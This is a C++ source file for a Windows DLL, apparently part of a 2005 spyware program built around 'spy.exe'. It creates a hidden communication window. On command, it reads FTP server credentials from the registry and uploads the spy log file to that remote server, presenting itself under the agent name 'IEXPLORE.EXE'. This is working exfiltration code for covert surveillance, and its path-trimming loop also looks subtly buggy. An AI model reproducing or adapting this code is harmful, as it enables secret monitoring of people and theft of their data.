// Written by Dor Alon 2005
//

#include "stdafx.h"
#include "../consts.h"
#include <Wininet.h>
#include <stdlib.h>

HWND g_hSpyWin;
HWND g_hCommWin = NULL;
char g_sSpyLogFileName[1024];
HMODULE g_hModule = NULL;

///////////////////////////////////////////////////////////////////////////////////////////////

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			g_hModule = (HMODULE) hModule;
			break;

		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		     break;
		
		case DLL_PROCESS_DETACH:
			if (g_hCommWin)
			{
				::PostMessage(g_hCommWin, WM_CLOSE, 0, 0);
				g_hCommWin = NULL;
			}
			break;
    }
    return TRUE;
}

///////////////////////////////////////////////////////////////////////////////////////////////

BOOL PutFtpFile(char* szLocalFileName, char* szFtpFileName, char* url, int port, char* username, char* password)
{
	HINTERNET hINet = NULL;
	HINTERNET hConnection = NULL;
    BOOL res = FALSE;

	for (int i=0; i<3 && !hINet; i++)
		hINet = InternetOpen("IEXPLORE.EXE", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
	
	if (!hINet) return FALSE;

	for (i=0; i<3 && !hConnection; i++)
		hConnection = InternetConnect(hINet, url, port, username, password, INTERNET_SERVICE_FTP, 0, 0);
	
	if (!hConnection) 
	{
		InternetCloseHandle(hINet);	
		return FALSE;
	}

	for (i=0; i<3 && !res; i++)
		res = ::FtpPutFile( hConnection, szLocalFileName, szFtpFileName, FTP_TRANSFER_TYPE_BINARY,0 );

	InternetCloseHandle(hConnection);
	InternetCloseHandle(hINet);

	return res;
}

////////////////////////////////////////////////////////////////////////////////////////////////

BOOL RegRead(char* szValue, TCHAR* lpValueName) 
{
	HKEY hOpenedKey;
	DWORD Type;
	DWORD cdData = 1024;
	szValue[0] = NULL;

	if (RegOpenKeyEx( HKEY_LOCAL_MACHINE, SPY_REG_KEY, 0, KEY_READ, &hOpenedKey) != ERROR_SUCCESS)
		return FALSE;

	if (RegQueryValueEx( hOpenedKey, lpValueName, 0, &Type, (BYTE*)szValue, &cdData) != ERROR_SUCCESS)
		return FALSE;

	RegCloseKey( hOpenedKey);
	
	return TRUE;
}

////////////////////////////////////////////////////////////////////////////////////////////////
//Communication window procedure

LRESULT CALLBACK CommunicationWinProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == MSG_WM_UPLOAD_FILE)
	{
		char szFtpFile[255];
		char szFtpUrl[255];
		char szFtpPort[255];
		char szFtpUser[255];
		char szFtpPassword[255];

		if (!RegRead(szFtpFile, REG_FTP_FILE))
			return 1;

		if (!RegRead(szFtpUrl, REG_FTP_URL))
			return 1;

		if (!RegRead(szFtpPort, REG_FTP_PORT))
			return 1;

		if (!RegRead(szFtpUser, REG_FTP_USER))
			return 1;

		if (!RegRead(szFtpPassword, REG_FTP_PASSWORD))
			return 1;

		int iFtpPort = atoi(szFtpPort);

		BOOL res = PutFtpFile(g_sSpyLogFileName, szFtpFile, szFtpUrl, iFtpPort, szFtpUser, szFtpPassword);
		::PostMessage(g_hSpyWin, MSG_WM_UPLOAD_FILE, (WPARAM)res, 0);
		return 0;
	}
	else
	{
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////
//Creates the communication window

void CALLBACK Init(HWND hSpyWin)
{
	g_hSpyWin = hSpyWin;

	WNDCLASS wc;
	
	//Searches for a comuunication window
	if(FindWindow(COMM_WIN_CLASS, NULL))
		return;

	if (GetClassInfo(GetModuleHandle(NULL), COMM_WIN_CLASS, &wc))
		return;
	
	wc.hCursor        = NULL;
	wc.hIcon          = NULL;
	wc.lpszMenuName   = NULL;
	wc.lpszClassName  = COMM_WIN_CLASS;
	wc.hbrBackground  = (HBRUSH)(COLOR_WINDOW + 1);
	wc.hInstance      = GetModuleHandle(NULL);
	wc.style          = 0;
	wc.lpfnWndProc    = CommunicationWinProc;
	wc.cbWndExtra     = 0;
	wc.cbClsExtra     = 0;
	
	if (RegisterClass(&wc) == 0) 
		return;
	
	g_hCommWin = CreateWindow(COMM_WIN_CLASS,"", WS_OVERLAPPEDWINDOW,0, 0, 0, 0, NULL, NULL,
				GetModuleHandle(NULL), NULL);

	//Retrive full path of spy.exe
	::GetModuleFileName(g_hModule, g_sSpyLogFileName, 1024);

	//Trim "spy.exe"
	while (g_sSpyLogFileName && g_sSpyLogFileName[strlen(g_sSpyLogFileName)-1] != '\\')
		g_sSpyLogFileName[strlen(g_sSpyLogFileName)-2] = NULL;

	strcat(g_sSpyLogFileName, LOG_FILE2);
}
